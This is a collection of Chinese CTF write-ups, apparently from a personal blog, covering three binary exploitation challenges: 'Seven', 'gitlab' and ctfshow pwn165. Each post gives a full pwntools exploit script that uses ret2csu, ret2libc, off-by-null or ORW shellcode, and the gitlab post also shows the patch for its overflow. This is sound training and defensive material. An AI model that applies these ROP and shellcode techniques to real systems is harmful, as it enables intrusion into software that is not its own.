[{"title":"2025星芒杯-PWN-Seven","url":"//about/links/2025/12/07/2025%E6%98%9F%E8%8A%92%E6%9D%AF-PWN-Seven","content":"2025星芒杯-PWN-Seven老规矩先checksec\nArch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)SHSTK:      EnabledIBT:        EnabledStripped:   No\n\n基本没什么保护\n直接看IDA\nmain：\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdout, 0LL);  setbuf(stdin, 0LL);  seccomp();//开了沙箱  vuln();  return 0;&#125;\n\n可以看见主函数调用了seccomp看一下禁用了什么\n&gt; seccomp-tools dump ./seven line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x06 0x00 0x00 0x00000000  return KILL\n\n只禁用了execve和execveat第一想法是打ORW，\n但是在vuln函数中我们发现了一些问题\nvoid *vuln()&#123;  void *result; // rax  void *buf; // [rsp+8h] [rbp-8h]  result = mmap((void *)0x600000, 0x1000uLL, 7, 1048610, -1, 0LL);  buf = result;  if ( result != (void *)-1LL )  &#123;    puts(&quot;Do you know what 7 characters can do?&quot;);    read(0, buf, 7uLL);    mprotect(buf, 0x1000uLL, 5);    return (void *)((__int64 (*)(void))buf)();  &#125;  return result;&#125;\n\n没有溢出，且允许读入的字节只有7个字节大小\n先简单分析一下程序逻辑：\n首先创建了一块0x600000-0x601000范围的区域，且具有RWX权限\n然后检查 mmap内存映射是否成功\n接着让我们读入七个字节，然后将刚刚那块内存区域的权限修改为RX权限，最后执行我们刚刚读入的数据\n原来的思路是构造read的系统调用，然后将我们的orw读取到0x600008然后执行的，但是 mprotect(buf, 0x1000uLL, 5);打断了这一思路\n换个思路，我们可以通过调用mprotect来重新修改0x600000这块区域的权限为RWX然后再构建一次读入orw最后执行输出flag\n那我们怎么实现7字节来调用这么多函数呢，ret2csu\n首先我们得构造这样一个read的系统调用\nread = asm(&quot;&quot;&quot;xor edi,edipop rsi pop rsisyscallret &quot;&quot;&quot;)\n我们的xor edi,edi为两个字节，两个pop rsi为2个字节，syscall为两个字节，ret为一个字节，刚刚好为7字节，满足了字节大小那能做些什么呢直接到pwndbg里看看\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA──────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off  RAX  0 RBX  0 RCX  0x79569b51eb1b (mprotect+11) ◂— cmp rax, -0xfff RDX  0x600000 ◂— xor edi, edi RDI  0x600000 ◂— xor edi, edi RSI  0x1000 R8   0x25 R9   0 R10  0x79569b4082e0 ◂— 0xf0022000056ec R11  0x202 R12  0x7fffd30df6a8 —▸ 0x7fffd30e1376 ◂— 0x6e657665732f2e /* &#x27;./seven&#x27; */ R13  0x401301 (main) ◂— endbr64  R14  0 R15  0x79569b7a8040 (_rtld_global) —▸ 0x79569b7a92e0 ◂— 0 RBP  0x7fffd30df580 —▸ 0x7fffd30df590 ◂— 1*RSP  0x7fffd30df568 —▸ 0x4012fe (vuln+127) ◂— nop *RIP  0x600000 ◂— xor edi, edi───────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on  ► 0x600000    xor    edi, edi               EDI =&gt; 0   0x600002    pop    rsi                    RSI =&gt; 0x4012fe (vuln+127)   0x600003    pop    rsi                    RSI =&gt; 0x7fffd30df590   0x600004    syscall  &lt;SYS_read&gt;   0x600006    ret        0x600007    add    byte ptr [rax], al   0x600009    add    byte ptr [rax], al   0x60000b    add    byte ptr [rax], al   0x60000d    add    byte ptr [rax], al   0x60000f    add    byte ptr [rax], al   0x600011    add    byte ptr [rax], al────────────────────────────────────────────────────────────────────[ STACK 00:0000│ rsp 0x7fffd30df568 —▸ 0x4012fe (vuln+127) ◂— nop 01:0008│-010 0x7fffd30df570 —▸ 0x7fffd30df590 ◂— 102:0010│-008 0x7fffd30df578 —▸ 0x600000 ◂— xor edi, edi03:0018│ rbp 0x7fffd30df580 —▸ 0x7fffd30df590 ◂— 104:0020│+008 0x7fffd30df588 —▸ 0x401345 (main+68) ◂— mov eax, 005:0028│+010 0x7fffd30df590 ◂— 106:0030│+018 0x7fffd30df598 —▸ 0x79569b429d90 (__libc_start_call_main+128) ◂— mov edi, eax07:0038│+020 0x7fffd30df5a0 ◂— 0──────────────────────────────────────────────────────────────────[ BACKTRACE  ► 0         0x600000 None   1         0x4012fe vuln+127   2         0x401345 main+68   3   0x79569b429d90 __libc_start_call_main+128   4   0x79569b429e40 __libc_start_main+128   5         0x40115e _start+46────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; \n可以看见此时rsp -&gt;0x7fffd30df568，我们的rdx控制的是读入字节大小不用管，rdi也已经控制为0了，但是我们如果进行两次pop rsi，我们就可以通过read调用来修改rbp 0x7fffd30df580 —▸ 0x7fffd30df590 中的数据为我们的ROP链，然后再执行一次ret重新执行一遍我们的’read‘来执行我们的rop链\n► 0x600004    syscall  &lt;SYS_read&gt;       fd: 0 (pipe:[48180])       buf: 0x7fffd30df590 ◂— 1       nbytes: 0x600000 ◂— xor edi, edi  0x600006    ret    \n\n执行ret：\n   0x600006   ret                                &lt;0x600000&gt;    ↓   0x600000    xor    edi, edi         EDI =&gt; 0   0x600002    pop    rsi              RSI =&gt; 0x4012fe (vuln+127)   0x600003    pop    rsi              RSI =&gt; 0x7ffed6eb59c0   0x600004    syscall  &lt;SYS_read&gt; ► 0x600006    ret                                &lt;0x600000&gt;    ↓   0x600000    xor    edi, edi              EDI =&gt; 0   0x600002    pop    rsi                   RSI =&gt; 0x7ffed6eb59c0   0x600003    pop    rsi                   RSI =&gt; 0x401345 (main+68)   0x600004    syscall  &lt;SYS_io_submit&gt;   0x600006   ret                                &lt;0x600000&gt;────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffed6eb59a8 —▸ 0x600000 ◂— xor edi, edi01:0008│ rbp 0x7ffed6eb59b0 —▸ 0x7ffed6eb59c0 —▸ 0x4013a6 (__libc_csu_init+86) ◂— add rsp, 8\n\n再次ret：\n   0x600006                         ret                                &lt;__libc_csu_init+86&gt;    ↓   0x600000                         xor    edi, edi              EDI =&gt; 0   0x600002                         pop    rsi                   RSI =&gt; 0x7ffed6eb59c0   0x600003                         pop    rsi                   RSI =&gt; 0x401345 (main+68)   0x600004                         syscall  &lt;SYS_io_submit&gt; ► 0x600006                         ret                                &lt;__libc_csu_init+86&gt;    ↓   0x4013a6 &lt;__libc_csu_init+86&gt;    add    rsp, 8                RSP =&gt; 0x7ffed6eb59d0 (0x7ffed6eb59c8 + 0x8)   0x4013aa &lt;__libc_csu_init+90&gt;    pop    rbx                   RBX =&gt; 0   0x4013ab &lt;__libc_csu_init+91&gt;    pop    rbp                   RBP =&gt; 1   0x4013ac &lt;__libc_csu_init+92&gt;    pop    r12                   R12 =&gt; 0x600000   0x4013ae &lt;__libc_csu_init+94&gt;    pop    r13                   R13 =&gt; 0x1000────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffed6eb59c0 —▸ 0x4013a6 (__libc_csu_init+86) ◂— add rsp, 8 ;这里rsp应该是0x7fffd30df590的，但是由于我重新调试了一遍，地址变了，但是流程还是一样的\n\n可以看见此时开始执行了我们的ROP链，后面就是利用mprotect修改权限然后read读入ORW最后返回到我们的ORW地址执行ORW\nRIP  0x40101a (_init+26) ◂— ret ───────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on    0x4013ac &lt;__libc_csu_init+92&gt;     pop    r12                   R12 =&gt; 0x6161616161616161   0x4013ae &lt;__libc_csu_init+94&gt;     pop    r13                   R13 =&gt; 0x6161616161616161   0x4013b0 &lt;__libc_csu_init+96&gt;     pop    r14                   R14 =&gt; 0x6161616161616161   0x4013b2 &lt;__libc_csu_init+98&gt;     pop    r15                   R15 =&gt; 0x6161616161616161   0x4013b4 &lt;__libc_csu_init+100&gt;    ret                                &lt;_init+26&gt;    ↓ ► 0x40101a &lt;_init+26&gt;               ret                                &lt;0x600008&gt;    ↓   0x600008                          mov    edi, 0x1010101        EDI =&gt; 0x1010101   0x60000d                          xor    edi, 0x1610101        EDI =&gt; 0x600000 (0x1010101 ^ 0x1610101)   0x600013                          xor    edx, edx              EDX =&gt; 0   0x600015                          xor    esi, esi              ESI =&gt; 0   0x600017                          push   2────────────────────────────────────────────────────────────────────[ STACK 00:0000│ rsp 0x7ffe81709228 —▸ 0x600008 ◂— mov edi, 0x1010101 /* 0x1f78101010101bf */\n\n[DEBUG] Received 0x80 bytes:    00000000  66 6c 61 67  7b 65 78 61  6d 70 6c 65  7d 0a 00 00  │flag│&#123;exa│mple│&#125;···│    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│    *    00000080flag&#123;example&#125;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$                      [*] Got EOF while reading in interactive$ [*] Interrupted[*] Process &#x27;./seven&#x27; stopped with exit code -11 (SIGSEGV) (pid 5061)\n\nexp:\nfrom pwn import *from LibcSearcher import*context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;psl = lambda data : p.sendline(data)ps = lambda data : p.send(data)pc = lambda data : p.recvuntil(data)ph = lambda data : print(hex(data))uu64 = lambda : u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))binary_name = &#x27;./seven&#x27;HOST = &quot;nc1.ctfplus.cn&quot;PORT = 25268choice = input(&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;)if &quot;y&quot; in choice:    p = process(binary_name)elif &quot;n&quot; in choice:    p = remote(HOST,PORT)#libc = ELF(&quot;&quot;)e = ELF(binary_name)def bug():    gdb.attach(p)    pause()# ========== Exploit 开始 ==========def exp():    pc(&quot;Do you know what 7 characters can do?&quot;)    read = asm(&quot;&quot;&quot;    xor edi,edi    pop rsi     pop rsi    syscall    ret     &quot;&quot;&quot;)    print(len(read))    rdi = 0x00000000004013b3    gadget1 = 0x401390    gadget2 = 0x4013a6    ret = 0x000000000040101a    bug()    ps(read)        ret = 0x000000000040101a    p1 = p64(gadget2)+p64(0)+p64(0)+p64(1)+p64(0x600000)+p64(0x1000)+p64(0x7)+p64(e.got[&#x27;mprotect&#x27;])+p64(gadget1)    p1+=p64(0)+p64(0)+p64(1)+p64(0)+p64(0x600000)+p64(0x1000)+p64(e.got[&#x27;read&#x27;])+p64(gadget1)+b&#x27;a&#x27;*0x38+p64(ret)+p64(0x600008)        psl(p1)    flag_str = 0x600000    flag_content = 0x600f00    orw = b&#x27;/flag\\x00\\x00\\x00&#x27;    orw += asm(shellcraft.open(flag_str))    orw += asm(shellcraft.read(3, flag_content, 0x80))    orw += asm(shellcraft.write(1, flag_content, 0x80))    pause()    psl(orw)        p.interactive()exp()\n\n\ncao-png.github.io感谢提供的思路\n\n","categories":["PWN"],"tags":["复现"]},{"title":"2025年江西省大学生信息安全技术大赛-决赛-PWN-Gitlab","url":"//about/links/2025/12/07/2025%E5%B9%B4%E6%B1%9F%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E5%86%B3%E8%B5%9B-PWN-gitlab","content":"2025年江西省大学生信息安全技术大赛-决赛-PWN-gitlab攻击拿到附件直接分析，一道简单的ret2libc\n主函数会先调用introduction()录入姓名，然后进行探险explore()\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  unsigned int v3; // eax  char v5[512]; // [rsp+0h] [rbp-210h] BYREF  int v6; // [rsp+200h] [rbp-10h]  int v7; // [rsp+204h] [rbp-Ch]  int v8; // [rsp+208h] [rbp-8h]  init(argc, argv, envp);  v3 = time(0LL);  srand(v3);  v6 = 100;  v7 = 20;  v8 = 0;  puts(&quot;Welcome to the adventure game!&quot;);  introduction(v5);  explore(v5);  return 0;&#125;\n\n漏洞点位于explore()中的visitShop()\nint __fastcall visitShop(__int64 a1)&#123;  char buf[2]; // [rsp+1Ah] [rbp-6h] BYREF  int v3; // [rsp+1Ch] [rbp-4h] BYREF  puts(&quot;You discover a shop in the ruins.&quot;);  puts(&quot;1. Buy health potion (20 gold)&quot;);  puts(&quot;2. Buy a better weapon (50 gold)&quot;);  puts(&quot;3. Leave the shop&quot;);  puts(&quot;4. Exit&quot;);  printf(&quot;Input 1, 2, 3, or 4: &quot;);  read(0, buf, 0xc8uLL);  (__isoc99_sscanf)(buf, &quot;%d&quot;, &amp;v3);  if ( v3 == 1 )  &#123;    if ( *(a1 + 0x204) &lt;= 19 )    &#123;      puts(&quot;You don&#x27;t have enough gold to buy the health potion.&quot;);    &#125;    else    &#123;      *(a1 + 0x204) -= 20;      *(a1 + 0x200) += 30;      puts(&quot;You purchase a health potion and gain 30 health.&quot;);    &#125;    return visitShop(a1);  &#125;  if ( v3 &lt;= 1 )  &#123;    if ( !v3 )      return puts(&quot;You enter the unknown forest...game over...&quot;);    goto LABEL_17;  &#125;  if ( v3 == 2 )  &#123;    if ( *(a1 + 516) &lt;= 49 )    &#123;      puts(&quot;You don&#x27;t have enough gold to buy a better weapon.&quot;);    &#125;    else    &#123;      *(a1 + 516) -= 50;      puts(&quot;You buy a better weapon and feel stronger!&quot;);    &#125;    return visitShop(a1);  &#125;  if ( v3 == 3 )  &#123;    puts(&quot;You leave the shop and continue your adventure.&quot;);    return explore(a1);  &#125;LABEL_17:  puts(&quot;Invalid choice, try again.&quot;);  return visitShop(a1);&#125;\n\n printf(&quot;Input 1, 2, 3, or 4: &quot;); read(0, buf, 0xc8uLL);此处存在栈溢出完全可以打ret2libc,没什么好说的直接上exp\nexp:\nfrom pwn import*from LibcSearcher import*p = process(&quot;./pwn-awdp&quot;)e = ELF(&quot;./pwn-awdp&quot;)#libc = ELF(&quot;./libc-2.31.so&quot;)context(arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)puts_got = e.got[&#x27;puts&#x27;]puts_plt = e.plt[&#x27;puts&#x27;]ph = lambda data : print(hex(data))uu64 = lambda  : u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))psl = lambda data : p.sendline(data)pc = lambda data : p.recvuntil(data)pop_rdi = 0x00000000004010b3ret = 0x00000000004006aemain =0x00000000400847def bug():\tgdb.attach(p)\tpause()\tdef choice(idx):\tpc(&quot;Input 1, 2, 3, or 4: &quot;)\tpsl(str(idx))\t\t#=======introduction=======\tp1 = b&#x27;1angx&#x27;pc(&quot;What should your character&#x27;s name be: &quot;)psl(p1)\t#=======explore========#choice(1)#pc(&quot;Input 1, 2, 3, or 4: &quot;)#bug()choice(2)p2= b&#x27;\\x01\\x00\\x00\\x00\\x00\\x00&#x27;+p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)#pc(&quot;Input 1, 2, 3, or 4: &quot;)psl(p2)psl(b&#x27;\\n&#x27;)pc(&quot;You enter the unknown forest...game over...\\n&quot;)#=======leak the libc base ========puts_addr = uu64()ph(puts_addr)&quot;&quot;&quot;base = puts_addr - libc.sym[&#x27;puts&#x27;]system = base + libc.sym[&#x27;system&#x27;]binsh = base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))&quot;&quot;&quot;libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)base = puts_addr - libc.dump(&quot;puts&quot;)system = base + libc.dump(&quot;system&quot;)binsh = base +libc.dump(&quot;str_bin_sh&quot;)#========get_shell========sleep(1)\t#choice(1)choice(2)p2= b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00&#x27;+p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) pc(&quot;Input 1, 2, 3, or 4: &quot;)#gdb.attach(p)psl(p2)#pause()#bug()p.interactive()\n\n修复按理来说直接修改溢出点的字节大小就可以防住\nint __fastcall visitShop(__int64 a1)&#123;  char buf[2]; // [rsp+1Ah] [rbp-6h] BYREF  int v3; // [rsp+1Ch] [rbp-4h] BYREF  puts(&quot;You discover a shop in the ruins.&quot;);  puts(&quot;1. Buy health potion (20 gold)&quot;);  puts(&quot;2. Buy a better weapon (50 gold)&quot;);  puts(&quot;3. Leave the shop&quot;);  puts(&quot;4. Exit&quot;);  printf(&quot;Input 1, 2, 3, or 4: &quot;);  read(0, buf, 2uLL); //改成两字节  (__isoc99_sscanf)(buf, &quot;%d&quot;, &amp;v3);  if ( v3 == 1 )  &#123;    if ( *(a1 + 0x204) &lt;= 19 )    &#123;      puts(&quot;You don&#x27;t have enough gold to buy the health potion.&quot;);    &#125;    else    &#123;      *(a1 + 0x204) -= 20;      *(a1 + 0x200) += 30;      puts(&quot;You purchase a health potion and gain 30 health.&quot;);    &#125;    return visitShop(a1);  &#125;  if ( v3 &lt;= 1 )  &#123;    if ( !v3 )      return puts(&quot;You enter the unknown forest...game over...&quot;);    goto LABEL_17;  &#125;  if ( v3 == 2 )  &#123;    if ( *(a1 + 516) &lt;= 49 )    &#123;      puts(&quot;You don&#x27;t have enough gold to buy a better weapon.&quot;);    &#125;    else    &#123;      *(a1 + 516) -= 50;      puts(&quot;You buy a better weapon and feel stronger!&quot;);    &#125;    return visitShop(a1);  &#125;  if ( v3 == 3 )  &#123;    puts(&quot;You leave the shop and continue your adventure.&quot;);    return explore(a1);  &#125;LABEL_17:  puts(&quot;Invalid choice, try again.&quot;);  return visitShop(a1);&#125;\n\n但是不知道为啥必须得修改gameover函数（希望有知道的师傅可以和我交流交流qaq）\n\n狠狠的被打烂了\n\n.text:0000000000400FD2                 call    ___isoc99_sscanf.text:0000000000400FD7                 mov     eax, [rbp+var_8].text:0000000000400FDA                 test    eax, eax.text:0000000000400FDC                 jz      short loc_40102E  ;此处将jz改为jnz即jnz  short loc_40102E.text:0000000000400FDE                 mov     rax, [rbp+s].text:0000000000400FE2                 mov     dword ptr [rax+200h], 64h ; &#x27;d&#x27;.text:0000000000400FEC                 mov     rax, [rbp+s].text:0000000000400FF0                 mov     dword ptr [rax+204h], 14h.text:0000000000400FFA                 mov     rax, [rbp+s].text:0000000000400FFE                 mov     dword ptr [rax+208h], 0.text:0000000000401008                 lea     rdi, aGreatLetSStart ; &quot;\\nGreat! Let&#x27;s start a new adventure!\\n&quot;\n\n\njz:为零则跳转,jnz: 非零则跳转\n\n改完后：\n__int64 __fastcall gameOver(__int64 a1)&#123;  int v2; // [rsp+18h] [rbp-8h] BYREF  char buf[2]; // [rsp+1Eh] [rbp-2h] BYREF  puts((const char *)a1);  puts(&quot;\\tGame Over, your adventure has come to an end.&quot;);  printf(    &quot;You collected %d gold, had %d health remaining, and reached level %d.&quot;,    *(unsigned int *)(a1 + 516),    *(unsigned int *)(a1 + 512),    (unsigned int)(*(_DWORD *)(a1 + 520) / 20 + 1));  printf(&quot;Do you want to play again? (1 for yes, 0 for no): &quot;);  read(0, buf, 2uLL);  __isoc99_sscanf(buf, &quot;%d&quot;, &amp;v2);  if ( v2 ) //原：if(!v2)  &#123;    puts(&quot;Thank you for playing!&quot;);    exit(0);  &#125;  *(_DWORD *)(a1 + 512) = 100;  *(_DWORD *)(a1 + 516) = 20;  *(_DWORD *)(a1 + 520) = 0;  puts(&quot;\\nGreat! Let&#x27;s start a new adventure!\\n&quot;);  introduction((void *)a1);  return explore(a1);&#125;\n\n","categories":["PWN"],"tags":["复现","AWDP"]},{"title":"CTFshow 刷题记录 162-...持续更新","url":"//about/links/2025/11/23/CTFshow%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20162-...%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0","content":"ctfshow-pwn-165堆利用里面放一个栈题也是没话说\n先checksec一下吧\n&gt; checksec pwn165[*] &#x27;/home/jian/Desktop/jiaoben/ctfshow/heap_qianzhi/pwn165/pwn165&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x3ff000)\n\n没啥保护，看看ida\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  const char *v3; // rdi  int v4; // [rsp+Ch] [rbp-14h] BYREF  const char *v5; // [rsp+10h] [rbp-10h]  char *v6; // [rsp+18h] [rbp-8h]  init_0(a1, a2, a3);  ctfshow();  v5 = &quot;%d&quot;;  change();  v6 = (char *)sub_400D56();  menu();  while ( 1 )  &#123;    printf(&quot;&gt; &quot;);    if ( (int)_isoc99_scanf(v5, &amp;v4) &lt;= 0 )      break;    switch ( v4 )    &#123;      case 1:        printf(&quot;Note:&quot;);        v6 = edit();        break;      case 2:        printf(&quot;Note:%s\\n&quot;, v6);                // show        break;      case 3:        save(v6);        puts(&quot;Saved!&quot;);        break;      case 4:        fclose(stream);        v3 = (const char *)sub_400B66(&amp;unk_602040);        unlink(v3);        change();        puts(&quot;Done!&quot;);        break;      case 5:        if ( stream )          fclose(stream);        exit(0);      default:        puts(&quot;Invalid choice&quot;);        break;    &#125;  &#125;  exit(0);&#125;\n\nedit:\nchar *edit()&#123;  char s[256]; // [rsp+0h] [rbp-100h] BYREF  _isoc99_scanf(&quot;%256s&quot;, s);  return strdup(s);&#125;\n\n乍一看以为没有溢出，但是这个是_isoc99_scanf()函数，当我们读取字符串时，会在末尾自动添加 \\0\n这就造成了一个off_by_null\n那有这个能干啥呢，调试看看\n运行到edit输入部分\n► 0x400e22    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;       format: 0x401619 ◂— 0x6e49007336353225 /* &#x27;%256s&#x27; */       vararg: 0x7fffffffdd48 —▸ 0x400a70 ◂— xor ebp, ebp\n\n我们先看看此时stack\npwndbg&gt; stack 3400:0000│ rsi rsp 0x7fffffffdd48 —▸ 0x400a70 ◂— xor ebp, ebp01:0008│-0f8     0x7fffffffdd50 —▸ 0x7fffffffdf50 ◂— 102:0010│-0f0     0x7fffffffdd58 ◂— 003:0018│-0e8     0x7fffffffdd60 ◂— 004:0020│-0e0     0x7fffffffdd68 —▸ 0x7fffffffde78 —▸ 0x7fffffffde70 —▸ 0x604280 ◂— 805:0028│-0d8     0x7fffffffdd70 —▸ 0x7ffff72558a9 (printf+153) ◂— add rsp, 0xd806:0030│-0d0     0x7fffffffdd78 —▸ 0x603040 ◂— 0xfbad249007:0038│-0c8     0x7fffffffdd80 ◂— 0x300000000808:0040│-0c0     0x7fffffffdd88 —▸ 0x7fffffffde58 —▸ 0x400a70 ◂— xor ebp, ebp09:0048│-0b8     0x7fffffffdd90 —▸ 0x7fffffffdd98 ◂— 00a:0050│-0b0     0x7fffffffdd98 ◂— 00b:0058│-0a8     0x7fffffffdda0 ◂— 10c:0060│-0a0     0x7fffffffdda8 —▸ 0x7ffff75c6790 ◂— 00d:0068│-098     0x7fffffffddb0 ◂— 0x100e:0070│-090     0x7fffffffddb8 ◂— 0... ↓            2 skipped11:0088│-078     0x7fffffffddd0 —▸ 0x7ffff727a419 (_IO_do_write+121) ◂— mov r13, rax12:0090│-070     0x7fffffffddd8 ◂— 713:0098│-068     0x7fffffffdde0 —▸ 0x7ffff75c5620 (_IO_2_1_stdout_) ◂— 0xfbad288714:00a0│-060     0x7fffffffdde8 ◂— 0xa /* &#x27;\\n&#x27; */15:00a8│-058     0x7fffffffddf0 —▸ 0x401611 ◂— xor eax, 0x7845202e /* &#x27;5. Exit&#x27; */16:00b0│-050     0x7fffffffddf8 —▸ 0x7fffffffdf50 ◂— 117:00b8│-048     0x7fffffffde00 —▸ 0x7ffff727a82b (_IO_file_overflow+235) ◂— cmp eax, -118:00c0│-040     0x7fffffffde08 ◂— 719:00c8│-038     0x7fffffffde10 —▸ 0x7ffff75c5620 (_IO_2_1_stdout_) ◂— 0xfbad28871a:00d0│-030     0x7fffffffde18 —▸ 0x401611 ◂— xor eax, 0x7845202e /* &#x27;5. Exit&#x27; */1b:00d8│-028     0x7fffffffde20 —▸ 0x7ffff726f80a (puts+362) ◂— cmp eax, -11c:00e0│-020     0x7fffffffde28 ◂— 01d:00e8│-018     0x7fffffffde30 —▸ 0x7fffffffde48 —▸ 0x7fffffffde78 —▸ 0x7fffffffde70 —▸ 0x604280 ◂— ...1e:00f0│-010     0x7fffffffde38 —▸ 0x400a70 ◂— xor ebp, ebp1f:00f8│-008     0x7fffffffde40 —▸ 0x400d53 ◂— nop 20:0100│ rbp     0x7fffffffde48 —▸ 0x7fffffffde78 —▸ 0x7fffffffde70 —▸ 0x604280 ◂— 821:0108│+008     0x7fffffffde50 —▸ 0x400f73 ◂— mov qword ptr [rbp - 8], rax\n\n我们的offbynull就可以修改rbp的末位字节为00\n还记得我们第一次输入菜单的时候\nv5 = &quot;%d&quot;;//很可疑change();v6 = (char *)sub_400D56();menu();while ( 1 )&#123;  printf(&quot;&gt; &quot;);  if ( (int)_isoc99_scanf(v5, &amp;v4) &lt;= 0 )\n\n这里为啥还要定义一个v5，看看汇编\n.text:0000000000400F0D loc_400F0D:                             ; CODE XREF: main:loc_401013↓j.text:0000000000400F0D                 mov     edi, offset asc_401637 ; &quot;&gt; &quot;.text:0000000000400F12                 mov     eax, 0.text:0000000000400F17                 call    printf.text:0000000000400F1C                 lea     rdx, [rbp+var_14].text:0000000000400F20                 mov     rax, [rbp+var_10] ;利用rbp寻址，var_10就是v5,那么我们就可以将v5的%d修改为%256s.text:0000000000400F24                 mov     rsi, rdx.text:0000000000400F27                 mov     rdi, rax.text:0000000000400F2A                 mov     eax, 0.text:0000000000400F2F                 call    __isoc99_scanf.text:0000000000400F34                 test    eax, eax.text:0000000000400F36                 jg      short loc_400F42.text:0000000000400F38                 mov     edi, 0          ; status.text:0000000000400F3D                 call    exit\n\n这里的一参是用rbp寻址的，那么我们就可以通过off by null修改这一值为%256s来打ret2csu来泄露libc，后面直接相同步骤getshell了\n\n(为什么不打ret2libc，因为puts_plt表里的值为400A00会被__isoc99_scanf截断，ret2csu我们是只需要got的)\n\n先贴一下exp：\nfrom pwn import *from LibcSearcher import*context.log_level = &#x27;debug&#x27;psl = lambda data : p.sendline(data)ps = lambda data : p.send(data)pc = lambda data : p.recvuntil(data)ph = lambda data : print(hex(data))uu64 = lambda : u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))binary_name = &#x27;./pwn165&#x27;HOST = &quot;pwn.challenge.ctf.show&quot;PORT =  28191choice = input(&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;)if &quot;y&quot; in choice:    p = process(binary_name)elif &quot;n&quot; in choice:    p = remote(HOST,PORT)e = ELF(binary_name)def bug():    gdb.attach(p)    pause()# ========== Exploit 开始 ==========def cmd(data):    pc(&quot;&gt;&quot;)    psl(str(data))def edit(data):    cmd(1)    pc(&quot;Note:&quot;)    ps(data)    def show():    cmd(2)    def save():    cmd(3)def change(ID):    cmd(4)    pc(&quot;Input your ID:&quot;)    psl(str(ID))           def exp():    gadget1=0x401060    gadget2=0x40107a    rdi = 0x00000000401083    ret = 0x00000000004009b1    fmt = 0x401619    puts_plt = 0x400A00    puts_got = e.got[&#x27;puts&#x27;]    main = 0x400EB0        p.recvuntil(&quot;Input your ID:&quot;)    psl(str(&quot;jian&quot;))        print(&quot;\\033[5;32m[+]=====put the fmt into rbp-0x10=====\\033[0m&quot;)    p1 = b&#x27;a&#x27;*0xa8+p64(fmt)+p64(0)*2        edit(p1.ljust(0x100,b&#x27;\\x00&#x27;))        print(&quot;\\033[5;32m[+]=====start ret2csu=====\\033[0m&quot;)        p2 = b&#x27;b&#x27;*(0x64)+p64(gadget2)+p64(0)+p64(1)+p64(e.got[&#x27;puts&#x27;])+p64(0)+p64(0)+p64(e.got[&#x27;puts&#x27;])+p64(gadget1)+b&#x27;b&#x27;*(0x38)+p64(main)    psl(p2.ljust(0x100,b&#x27;a&#x27;))        print(&quot;\\033[5;32m[+]=====leak the libc=====\\033[0m&quot;)        puts_addr = uu64()    ph(puts_addr)    libc = ELF(&quot;./libc-2.23.so&quot;)    base = puts_addr - libc.sym[&quot;puts&quot;]    system = base + libc.sym[&quot;system&quot;]    binsh = base + next(libc.search(&quot;/bin/sh&quot;))    ph(base)    ph(system)    print(&quot;\\033[5;32m[+]=====get shell=====\\033[0m&quot;)        p.recvuntil(&quot;Input your ID:&quot;)    psl(str(&quot;jian&quot;))    p1 = 